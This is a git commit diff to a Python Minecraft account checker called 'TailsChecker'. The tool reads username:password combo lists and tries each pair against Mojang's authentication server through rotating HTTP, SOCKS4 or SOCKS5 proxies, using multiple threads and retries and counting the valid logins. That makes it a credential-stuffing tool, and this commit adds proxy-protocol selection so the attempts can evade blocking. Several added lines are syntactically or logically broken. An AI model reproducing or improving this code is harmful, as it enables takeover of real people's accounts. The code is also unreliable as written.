b504a580c1df31130a1e89dfe6c4a0f090884d62
Lau <86260922+n3k2@users.noreply.github.com>
2021-11-17 08:19:56 +0200

    full proxy support

--- ack.py
+++ ack.py
@@ -19,7 +19,7 @@ class Colors:
     magenta = Fore.LIGHTMAGENTA_EX
 Colors()
 
-version = "v0.10.2"
+version = "0.1.1"
 mark = f'{red}\n' + requests.get("https://pastebin.com/raw/uxJtrC3n").text + f"\n\n{red}  TailsChecker-{version} »» Created by Tails Team\n"
 
 class Main:
@@ -32,6 +32,13 @@ class Main:
         self.counter = 0
         self.valid = 0
         self.hide = False
+        self.protocol = None
+
+    def proxy_type(self):
+        self.protocol = int(input(f"{red} > {white} Please select your proxies protocol (HTTP = 1, SOCKS4 = 2, SOCKS5 = 3): "))
+        if self.protocol < 1 or self.protocol > 3:
+            print(f"{yellow} ERROR {white}: Incorrect value entered, retry.")
+        
 
     def load_proxies(self):
         print(mark)
@@ -59,6 +66,8 @@ class Main:
                 except:
                     pass
 
+            print(f"{red}> {white}Loaded [{len(self.proxy_list)}] proxies lines..\n")
+
     def load_combos(self):
         if os.path.exists("combo.txt"):
             with open("combo.txt", "r") as f:
@@ -68,15 +77,19 @@ class Main:
                         self.passwords.append(line.split(":")[-1])
             if not len(self.usernames): return None
             return True
-        print(mark)
-        os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
-        print(mark)
-        print(f"> {yellow}ERROR{white} : No combo file found: \'combo.txt\''")
-        combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").read().splitlines()
-        for line in combo:
-            self.usernames.append(line.split(":")[0])
-            self.passwords.append(line.split(":")[-1])
-        exit()
+        
+        else:
+            print(mark)
+            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
+            print(mark)
+            print(f"> {yellow}ERROR{white} : No combo file found, please select your combo.")
+            combo = open(fileopenbox(title="Load Combo List", default="*.txt"), "r", encoding="UTF-8", errors="ignore").read().splitlines()
+            for line in combo:
+                for ":" in line:
+                    self.usernames.append(line.split(":")[0])
+                    self.passwords.append(line.split(":")[-1])
+            if not len(self.usernames): return None
+            return True
     
     def title(self):
         ctypes.windll.kernel32.SetConsoleTitleW("TC | Valid: {} | Invalid: {} | Checked: {}/{} | Remaining: {}".format(self.valid, self.invalid, (self.valid + self.invalid), len(self.usernames), (len(self.usernames) - (self.valid + self.invalid))))
@@ -90,12 +103,15 @@ class Main:
         try:
             session = self.session()
             proxy = random.choice(self.proxy_list)
+            if self.proxy_type == 1:
+                proxy_send = {"http": f"http://{proxy}", "https": f"https://{proxy}"}
+            elif self.proxy_type == 2:
+                proxy_send = {"http": f"socks4://{proxy}", "https": f"socks4://{proxy}"}
+            elif self.proxy_type = 3:
+                proxy_send = {"http": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080", "https": "socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"}
             pxhidden = f'{proxy.split(":")[0]}:{proxy.split(":")[1]}:{red}**********{white}:{red}**********'
             json = {"agent": {"name": "Minecraft", "version": "1"}, "clientToken": None, "password": password, "requestUser": "true", "username": username}
-            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = dict(
-                http="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080",
-                https="socks5://" + proxy.split(":")[2] + ":" + proxy.split(":")[3] + "@" + proxy.split(":")[0] + ":1080"
-            ))
+            check = session.post("https://authserver.mojang.com/authenticate", json = json, headers = {"User-Agent": "MinecraftLauncher/1.0"}, proxies = proxy_send)
 
             if "accessToken" in check.json():
                 if self.hide:
@@ -141,6 +157,7 @@ class Main:
 
     def start(self):
         os.system("cls")
+        self.proxy_type()
         self.load_proxies()
         self.start_checking()
 
@@ -149,11 +166,11 @@ class Main:
         load_combo = self.load_combos()
         if load_combo is not None:
             print(mark)
-            self.threads = int(input(f'{red}> {white}Threads: '))
+            self.threads = int(input(f"{red}> {white}Threads: "))
             os.system("cls")
             print(mark)
             try:
-                passwords = int(input(f'{red}> {white}Hide passwords (default: 0 = no, 1 = yes): '))
+                passwords = int(input(f"{red}> {white}Hide passwords (default: 0 = no, 1 = yes): "))
                 if passwords == 1:
                     self.hide = True
                 else:
@@ -164,20 +181,20 @@ class Main:
             os.system("cls")
             print(mark)
             try:
-                self.retries = int(input(f'{red}> {white}Retries (default: 0, 3 max): '))
+                self.retries = int(input(f"{red}> {white}Retries (default: 0, 3 max): "))
                 if self.retries == 0:
                     self.retries = 1
                 elif self.retries > 3 or self.retries < 1:
                     retries_old = self.retries
                     self.retries = 1
-                    print(f'{red}Unexpected value ({retries_old}, new value {self.retries}')
+                    print(f"{red}Unexpected value ({retries_old}, new value {self.retries}")
                     self.start()
             except Exception:
                 self.retries = 1
                 self.start()
         else:
-            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("Minecraft Account Checker | Error"); 
-            print(f'\n{yellow}ERROR{white} : Please put your combos inside of \'combo.txt\''); time.sleep(10); 
+            os.system("cls"); ctypes.windll.kernel32.SetConsoleTitleW("TC | Error"); 
+            print(f"\n{yellow}ERROR{white} : Combos could not be loaded."); time.sleep(10); 
             exit()
 
 Main().main()
